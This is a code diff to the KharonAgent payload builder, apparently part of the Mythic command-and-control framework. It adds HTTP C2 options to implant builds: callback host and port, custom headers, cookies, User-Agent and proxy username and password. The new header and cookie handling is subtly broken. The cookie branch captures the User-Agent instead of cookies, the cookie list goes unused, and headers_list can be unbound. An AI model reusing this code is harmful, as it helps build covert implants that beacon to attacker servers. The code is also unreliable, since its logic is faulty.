@@ -250,35 +250,57 @@ class KharonAgent(PayloadType):
         if c2_profile == "http":
             http_config = {
                 "callback_host": "",
-                "User-Agent": "",
                 "callback_jitter": 0,
                 "callback_interval": 0,
+                "User-Agent": "",
+                "headers": "",
+                "cookies": [],
                 "httpMethod": "POST",
                 "post_uri": "",
                 "callback_port": 80,
                 "ssl": False,
-                "proxyEnabled": False,
+                "proxy_enabled": False,
+                "proxy_url": "",
                 "proxy_host": "",
+                "proxy_port": "",
                 "proxy_user": "",
                 "proxy_pass": "",
             }
 
-            # Get HTTP parameters from Mythic
             for c2 in self.c2info:
                 params = c2.get_parameters_dict()
+                
                 for key in http_config.keys():
-                    if key in params:
-                        if key == "headers" and "User-Agent" in params[key]:
-                            http_config["User-Agent"] = params[key]["User-Agent"]
-                        else:
-                            http_config[key] = params[key]
-                break
+                    if key in params and key != "headers":
+                        http_config[key] = params[key]
+                
+                if "headers" in params:
+                    headers = params["headers"]
+                    
+                    if "User-Agent" in headers:
+                        http_config["User-Agent"] = headers["User-Agent"]
+                    
+                    headers_list = []
+                    cookie_list  = []
+                    for key, value in headers.items():
+                        if key.lower() != "user-agent":  
+                            headers_list.append(f"{key}: {value}")
+                        elif key.lower() != "cookie":  
+                            cookie_list.append(f"{key}: {value}")
+                    
+            if headers_list:
+                http_config["headers"] = "\\r\\n".join([""] + headers_list + [""]) + "\\r\\n"
+            else:
+                http_config["headers"] = ""
 
-            # Process HTTP-specific configurations
-            http_config["callback_host"] = http_config["callback_host"].replace(
-                "https://", "").replace("http://", "")
-            http_config["post_uri"] = "/" + http_config["post_uri"].lstrip("/")
+            if http_config["proxy_host"] != "":
+                http_config["proxy_host"]    = http_config["proxy_host"].replace("https://", "").replace("http://","");
+                http_config["proxy_enabled"] = True
+                http_config["proxy_url"]     = f"{http_config['proxy_host']}:{http_config['proxy_port']}"
+            
             http_config["ssl"] = "https://" in self.c2info[0].get_parameters_dict().get("callback_host", "")
+            http_config["callback_host"] = http_config["callback_host"].replace("https://", "").replace("http://", "")
+            http_config["post_uri"] = "/" + http_config["post_uri"].lstrip("/")
             
             config.update(http_config)
 
@@ -321,13 +343,22 @@ class KharonAgent(PayloadType):
 
         # Add C2-specific definitions
         if c2_profile == "http":
+            cookies_formatted = "{" + ", ".join(config["cookies"]) + "}"
+
             build_config["c2_defs"].extend([
                 f"PROFILE_C2=0x25",  # Changed to 0x25 for HTTP
                 f"WEB_PORT={config.get('callback_port', 80)}",
                 f"WEB_HOST={config['callback_host']}",
                 f"WEB_ENDPOINT={config['post_uri']}",
                 f'WEB_USER_AGENT="{config["User-Agent"]}"',
-                f"WEB_SECURE_ENABLED={1 if config['ssl'] else 0}",
+                f'WEB_HTTP_HEADERS="{config["headers"]}"',
+                f"WEB_HTTP_COOKIES={cookies_formatted}",
+                f"WEB_HTTP_COOKIES_QTT={len(config['cookies'])}",
+                f"WEB_SECURE_ENABLED={int(config['ssl'])}",
+                f"WEB_PROXY_ENABLED={int(config['proxy_enabled'])}",
+                f"WEB_PROXY_URL={config['proxy_url']}",
+                f"WEB_PROXY_PASSWORD={config['proxy_pass']}",
+                f"WEB_PROXY_USERNAME={config['proxy_user']}",
             ])
         elif c2_profile == "smb":
             build_config["c2_defs"].extend([
